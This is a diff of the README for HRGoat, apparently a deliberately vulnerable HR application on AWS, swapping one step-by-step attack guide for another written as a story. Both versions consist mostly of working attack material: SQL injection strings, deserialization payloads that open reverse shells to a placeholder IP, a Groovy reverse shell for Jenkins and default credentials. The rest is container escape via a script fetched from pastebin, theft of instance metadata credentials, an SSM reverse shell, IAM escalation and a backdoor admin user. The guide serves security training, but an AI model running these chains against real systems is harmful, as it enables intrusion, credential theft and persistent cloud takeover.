@@ -305,229 +305,217 @@ The repository includes automated workflows for deployment:
      - Build and push the Docker image to ECR
      - Deploy the application to EC2 instances
 
-3. **Accessing the Application**:
-   - Once deployed, the workflow output will display:
-     - Application Load Balancer URL
-     - EC2 instance IP addresses
-     - Jenkins server URL
 
-## Vulnerability Overview & Exploitation Guide
+# 🎭 The Great Escape: From SQLi to Full AWS Takeover
 
-This section documents the vulnerabilities present in HRGoat and how to exploit them for educational purposes.
+## ⚠️ Disclaimer
+> This project is for educational and authorized security research purposes only. Unauthorized use of these techniques is illegal and unethical.
 
-### 1. SQL Injection Vulnerability
+## 🏴‍☠️ The Adventure Begins
+Once upon a time, in a land of misconfigured cloud environments, a daring security researcher set out on a quest to explore the depths of vulnerabilities. What started as a simple SQL injection led to an ultimate privilege escalation inside AWS. Let's follow the trail!
 
-**Location**: Employee search functionality
+---
 
-**Exploitation**:
-1. Navigate to the employee directory page
-2. In the search field, enter: `' OR 1=1 --`
-3. This will bypass the search restrictions and display all employees
-4. For more advanced exploitation, use: `' UNION SELECT user,password,3,4,5,6,7,8,9,10,11 FROM users --`
-5. This reveals user credentials from the database
+## 🎬 Step 1: The Gate is Wide Open (SQL Injection)
+![image](https://github.com/user-attachments/assets/3519076c-3c8c-4cea-96d9-bbb33c331fe6)
 
-**Impact**: Data exposure, potential for complete database compromise
-
-### 2. Insecure Deserialization Vulnerability
-
-**Location**: Employee bulk upload feature
-
-**Exploitation**:
-1. Navigate to the "Bulk Upload" page under employee management
-2. Create a malicious JSON payload with an RCE exploit in the metadata field:
-```json
-{
-  "name": "Test User",
-  "position": "Tester",
-  "department": "Security",
-  "email": "test@example.com",
-  "phone": "555-000-0000",
-  "location": "Remote",
-  "hire_date": "2023-01-01",
-  "status": "active",
-  "manager": "None",
-  "salary": 0,
-  "bio": "This is a test.",
-  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { cp.exec('ping -c 4 8.8.8.8', function(error, stdout, stderr) { if (error) { fs.writeFileSync('/tmp/error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/ping_success.log', stdout); } }); } catch (e) { fs.writeFileSync('/tmp/exception.log', 'EXCEPTION: ' + e.message); } return '';}()\"}"
-}
+Our journey starts at a login screen. With a bit of old-school magic, we bypass authentication using:
+```sql
+' or '1'='1
 ```
-3. Upload this payload using the "Upload Employees" button
-4. The `metadata` field contains a Node.js deserialization vulnerability that allows remote code execution
-5. Verify exploitation by checking if `/tmp/ping_success.log` was created
 
-**Advanced Exploitation - Reverse Shell**:
-```json
-{
-  "name": "Malicious User",
-  "position": "Hacker",
-  "department": "Security",
-  "email": "hack@example.com",
-  "phone": "555-000-0000",
-  "location": "Remote",
-  "hire_date": "2023-01-01",
-  "status": "active",
-  "manager": "None",
-  "salary": 0,
-  "bio": "This is a test.",
-  "metadata": "{\"rce\":\"_$$ND_FUNC$$_function(){const cp = require('child_process'); const fs = require('fs'); try { fs.writeFileSync('/tmp/shell_attempt.log', 'Attempting reverse shell'); cp.exec('/bin/bash -c \\\"/bin/bash -i > /dev/tcp/YOUR_IP_HERE/4444 0<&1 2>&1\\\"', function(error, stdout, stderr) { if (error) { fs.writeFileSync('/tmp/shell_error.log', 'ERROR: ' + error.message); } else { fs.writeFileSync('/tmp/shell_success.log', 'Shell executed successfully'); } if (stderr) { fs.writeFileSync('/tmp/shell_stderr.log', stderr); } }); } catch (e) { fs.writeFileSync('/tmp/shell_exception.log', 'EXCEPTION: ' + e.message); } return '';}()\"}"
-}
-```
-Replace `YOUR_IP_HERE` with your attack machine's IP and set up a listener with `nc -lvnp 4444`
+Boom! We're in. But this is just the beginning...
 
-**Impact**: Complete remote code execution on the application container
+---
 
-### 3. Container Escape Vulnerability
+## 🎭 Step 2: Exploiting Insecure Deserialization
 
-**Location**: Docker container configuration
-
-**Prerequisites**:
-- Access to the application container (via previous RCE)
-- The container is running with the `--privileged` flag
-
-**Exploitation**:
-1. From your reverse shell in the container, download the container escape script:
+To take it a step further, we leverage an insecure deserialization vulnerability. First, ensure you have a machine ready to receive a reverse shell:
 ```bash
-curl -o escape.sh https://raw.githubusercontent.com/yourusername/hr-portal-symphony/main/container_escape_shell.sh
+nc -lvnp 4444
+```
+![image](https://github.com/user-attachments/assets/d346b289-b820-41ac-9d6e-d36fa1938085)
+
+Navigate to System Tools and then Bulk Employee Upload
+
+![image](https://github.com/user-attachments/assets/68dfbb66-245f-45dc-9e70-71ad58afc431)
+
+Modify `rce_exploit.json` found in the `examples` folder, setting your remote IP and port. Then, execute the exploit payload.
+
+---
+
+## 🚀 Step 3: Inside the Container!
+
+We’ve successfully landed in the container. 
+![image](https://github.com/user-attachments/assets/52b12748-7744-4f91-b115-8d306e12d386)
+
+
+But now, let’s check if we can escape:
+```bash
+grep CapEff /proc/self/status
+```
+![image](https://github.com/user-attachments/assets/a6e91fd6-c4af-4eb0-98fb-218b3a618120)
+
+If we see certain privilege bits set, it's time to break free! 🔓
+
+---
+
+## 🛠️ Step 4: Breaking Out of the Container
+
+Let's grab and execute the escape script, make sure to create new listener and change the IP and port number that within the script:
+```bash
+cd /tmp
+wget -O escape.sh https://pastebin.com/raw/YSbnzY2r
+sed -i 's/\r$//' escape.sh
 chmod +x escape.sh
 ./escape.sh
 ```
+![image](https://github.com/user-attachments/assets/b90a0976-0cdc-4b7a-8d4a-d82fa000f92e)
 
-2. The script will detect the privileged container and offer multiple methods:
-   - Direct host filesystem access via disk mount
-   - Cgroups release_agent exploitation
-   - Several shell access options:
-     - Chroot shell
-     - Bind shell
-     - Reverse shell
-     - Command execution bridge
+We are now inside the EC2 instance. 
 
-3. For the simplest approach, choose the direct chroot shell if the host filesystem mount succeeds
 
-**Impact**: Complete escape from container isolation, gaining access to the underlying host
+---
 
-### 4. Network Discovery & Jenkins Exploitation
+## 🔑 Step 5: Querying the IMDS for AWS Credentials
 
-**After container escape, install tools and discover Jenkins**:
+Let’s try to obtain a metadata token:
 ```bash
-# Install nmap on the host
-apt-get update
-apt-get install -y nmap
-
-# Scan the internal network (10.0.0.0/16 subnet for AWS VPC)
-nmap -sV -p- 10.0.0.0/16 --open
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 ```
+![image](https://github.com/user-attachments/assets/5aa90b82-5f83-4e76-9e79-4b660fdd027d)
 
-**Exploiting Jenkins**:
-1. The scan should reveal Jenkins running on port 8080 within the same VPC
-2. Access the Jenkins instance (using internal IP or hostname)
-3. Jenkins exploitation options:
-   - If unauthenticated access to script console:
-     ```
-     navigate to /script and execute: 
-     println "whoami".execute().text
-     ```
-   - If credentials are required, common default credentials:
-     - admin:admin
-     - admin:password
-     - jenkins:jenkins
-   - Create a reverse shell via script console:
-     ```groovy
-     String host="YOUR_IP_HERE";
-     int port=5555;
-     String cmd="/bin/bash";
-     Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
-     Socket s=new Socket(host,port);
-     InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
-     OutputStream po=p.getOutputStream(),so=s.getOutputStream();
-     while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-     ```
-   - Start another listener: `nc -lvnp 5555`
-
-### 5. Jenkins Container Breakout & Privilege Escalation
-
-**Check if Jenkins container is privileged**:
+Success! Now let’s fetch security credentials:
 ```bash
-cat /proc/self/status | grep CapEff
+ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
 ```
+![image](https://github.com/user-attachments/assets/0068eb1c-f521-4012-9337-b19dd1034a01)
 
-**If privileged, escape the container**:
+Looks like we have `hrgoat-ssm-role`. Let's extract its credentials:
 ```bash
-# Use the same container escape technique from earlier
-./container_escape_shell.sh
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
 ```
+![image](https://github.com/user-attachments/assets/0f257ddf-90a1-43d0-aa2e-85605d2c57bf)
 
-**Perform host privilege escalation if needed**:
+And there it is—Access Key ID, Secret Access Key, and Session Token! 🔥
+
+---
+
+## 🏠 Step 6: Using EC2 Credentials Locally
+
+Now, let’s shift operations to our local machine:
 ```bash
-# Check for common misconfigurations
-find / -perm -4000 -exec ls -l {} \; 2>/dev/null  # SUID binaries
-find / -writable -type d 2>/dev/null  # Writable directories
-sudo -l  # Sudo permissions
-
-# If Docker is available on the host
-docker images
-# If you have Docker access, you can mount the host filesystem:
-docker run -v /:/hostfs -it ubuntu chroot /hostfs bash
+export AWS_ACCESS_KEY_ID=<VALUE>
+export AWS_SECRET_ACCESS_KEY=<VALUE>
+export AWS_SESSION_TOKEN=<VALUE>
 ```
-
-### 6. AWS IAM Privilege Escalation
-
-**Check AWS credentials and permissions**:
+Verify with:
 ```bash
-# Look for AWS credentials
-find / -name "credentials" | grep ".aws"
-cat ~/.aws/credentials
-env | grep AWS
-
-# Check attached IAM role
-curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+aws sts get-caller-identity
 ```
+![image](https://github.com/user-attachments/assets/37bd2d45-44a5-414f-98ce-0d501f4d1fc7)
 
-**Enumerate permissions**:
+We have AWS credentials. Time to enumerate our permissions!
+
+---
+
+## 🔍 Step 7: Mapping Out AWS Permissions
+
+Run `check_aws_permissions.sh` from the `examples` folder to identify what actions we can perform.
+![image](https://github.com/user-attachments/assets/261c268c-e198-49eb-9d7d-935a7dc2b2fe)
+
+
+We find permissions allowing us to list EC2 instances and send SSM commands. Perfect for lateral movement!
+
+---
+
+## 📡 Step 8: Moving Laterally with SSM
+
+Let’s list EC2 instances:
 ```bash
-# Install AWS CLI if needed
-apt-get install -y python3-pip
-pip3 install awscli
-
-# List permissions
-aws iam list-attached-role-policies --role-name $(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-aws iam get-policy-version --policy-arn <policy_arn> --version-id <version_id>
+aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,Tags[?Key==`Name`].Value|[0]]' --output table
 ```
+![image](https://github.com/user-attachments/assets/f90a2073-464d-4aba-a12e-bc7c90257fdf)
 
-**If overly permissive IAM policy exists, create an admin user**:
+Found one that looks interesting. Let’s gain access (create new listener, with another port):
 ```bash
-# Create admin user
+aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceIds,Values=i-0d76444a40c11c1bf" --parameters "commands=['bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1']" --region us-east-1
+```
+![image](https://github.com/user-attachments/assets/162a99c3-0810-4a43-9baf-a2342491c6f5)
+
+Now we have a shell on a second machine. Time to escalate further!
+
+---
+
+## 🏆 Step 9: Privilege Escalation
+
+From the new EC2 instance, repeat the credential extraction process:
+```bash
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+echo $TOKEN
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
+```
+![image](https://github.com/user-attachments/assets/b0f2e89b-5297-4530-802b-ad7765f8f247)
+
+Fetch roles and credentials, and analyze the permissions.
+![image](https://github.com/user-attachments/assets/6f228930-93e1-4cd3-926b-d3903ab99ad7)
+
+---
+
+## 🎯 Step 10: Escalating to Administrator
+
+We find that `hrgoat-jenkins-role` has IAM modification permissions. 
+![image](https://github.com/user-attachments/assets/4feefa82-0f32-4d2f-8863-8161da3eeb06)
+
+
+Let’s exploit it:
+```bash
+aws iam attach-role-policy --role-name hrgoat-jenkins-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+```
+![image](https://github.com/user-attachments/assets/a7a8846e-78ee-4e7f-84c8-f791b4aa5797)
+
+Check if it worked:
+```bash
+aws iam list-users
+```
+![image](https://github.com/user-attachments/assets/dbb2a40f-ea9c-4cd3-86ab-ba110ecc8b8b)
+
+We have admin rights! 🏆
+
+---
+
+## 🚪 Step 11: Planting a Persistent Admin User
+
+Let’s create a backdoor admin:
+```bash
 aws iam create-user --user-name backdoor-admin
-
-# Assign administrator permissions
-aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
-
-# Create access keys
 aws iam create-access-key --user-name backdoor-admin
-
-# Output will show:
-# AccessKeyId: AKIAXXXXXXXXXXXXXXXX
-# SecretAccessKey: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws iam list-attached-user-policies --user-name backdoor-admin
 ```
+### Create New User
+![image](https://github.com/user-attachments/assets/18bb0ec6-09a2-4c62-9bf2-3e5d48e5da1e)
 
-## Security Remediation
+### Create User Access Key
+![image](https://github.com/user-attachments/assets/28029293-8b4e-4afe-b60d-cdc5b7c3b677)
 
-To address the vulnerabilities in this application, consider the following remediations:
+### Assign permissions and verify it worked
+ ![image](https://github.com/user-attachments/assets/c53dc66b-333e-40e3-9af5-004cc4eab627)
 
-1. **SQL Injection**: Implement parameterized queries and input validation
-2. **Insecure Deserialization**: Avoid deserializing user-controlled data or implement secure deserialization libraries
-3. **Container Security**: Never use the `--privileged` flag; apply principle of least privilege
-4. **Network Segmentation**: Implement proper VPC security groups and network ACLs
-5. **Jenkins Security**: Use strong authentication, remove default credentials, restrict Script Console access
-6. **IAM Security**: Follow least privilege principle for IAM policies; implement role assumption with temporary credentials
 
-## Responsible Disclosure
+Success! Now, full control of the AWS environment is ours.
 
-This project is intended for educational purposes in controlled environments. If you discover similar vulnerabilities in production systems, please follow responsible disclosure practices.
+---
 
-## License
+## 🎉 Conclusion
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+From a simple SQLi to full AWS environment control, we navigated through multiple security misconfigurations and privilege escalations. This journey highlights the importance of:
+- Proper input validation to prevent SQLi
+- Secure deserialization practices
+- Restricting container privileges
+- Securing AWS metadata service access
+- Applying least privilege principles in AWS IAM
 
-## Disclaimer
+---
 
-This software is provided for educational purposes only. Using security testing techniques on systems without explicit permission is illegal. The author is not responsible for any misuse of this software.
+💡 **For Defensive Countermeasures & Hardening Tips, see** `SECURITY.md` 🚧
